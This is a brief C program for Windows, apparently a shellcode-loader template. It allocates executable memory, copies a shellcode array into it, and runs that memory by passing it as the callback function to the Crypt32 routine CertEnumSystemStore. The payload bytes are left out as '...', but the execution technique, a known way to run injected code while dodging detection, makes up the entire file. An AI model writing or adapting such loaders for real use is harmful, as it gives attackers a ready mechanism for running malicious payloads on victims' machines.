#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

// Crypt32
unsigned char shellcode[] = ...

int main() {
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, shellcode, sizeof(shellcode));
    CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)addr);
}